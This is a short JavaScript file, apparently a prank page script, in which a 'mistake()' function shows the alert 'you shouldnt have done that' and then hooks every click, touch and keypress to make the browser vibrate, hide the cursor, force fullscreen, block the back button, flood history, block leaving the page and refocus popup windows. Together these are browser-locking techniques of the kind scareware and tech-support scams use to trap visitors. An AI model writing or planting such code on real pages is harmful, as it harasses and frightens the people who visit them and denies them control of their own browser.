const wins = []

function mistake() {
    window.alert("you shouldnt have done that");
    confirmPageUnload();
    document.getElementById('buttons').style.display='none';

    interceptUserInput(() => {
        startVibrateInterval();
        hideCursor();
        requestFullscreen();
        blockBackButton();
        fillHistory();
        focusWindows();
    });
}

function confirmPageUnload () {
    window.addEventListener('beforeunload', event => {
        event.returnValue = true
    })
}
function startVibrateInterval () {
    if (typeof window.navigator.vibrate !== 'function') return;
    setInterval(() => {
        const duration = Math.floor(Math.random() * 600);
        window.navigator.vibrate(duration)
    }, 1000)
}
function interceptUserInput (onInput) {
    document.body.addEventListener('touchstart', onInput, { passive: false });

    document.body.addEventListener('mousedown', onInput);
    document.body.addEventListener('mouseup', onInput);
    document.body.addEventListener('click', onInput);

    document.body.addEventListener('keydown', onInput);
    document.body.addEventListener('keyup', onInput);
    document.body.addEventListener('keypress', onInput)
}
function hideCursor () {
    document.querySelector('html').style = 'cursor: none;'
}
function requestFullscreen () {
    const requestFullscreen = Element.prototype.requestFullscreen ||
        Element.prototype.webkitRequestFullscreen ||
        Element.prototype.mozRequestFullScreen ||
        Element.prototype.msRequestFullscreen;

    requestFullscreen.call(document.body)
}
function blockBackButton () {
    window.addEventListener('popstate', () => {
        window.history.forward()
    })
}
function fillHistory () {
    for (let i = 1; i < 20; i++) {
        window.history.pushState({}, '', window.location.pathname + '?q=' + i)
    }
    window.history.pushState({}, '', window.location.pathname)
}
function focusWindows () {
    wins.forEach(win => {
        if (!win.closed) win.focus()
    })
}
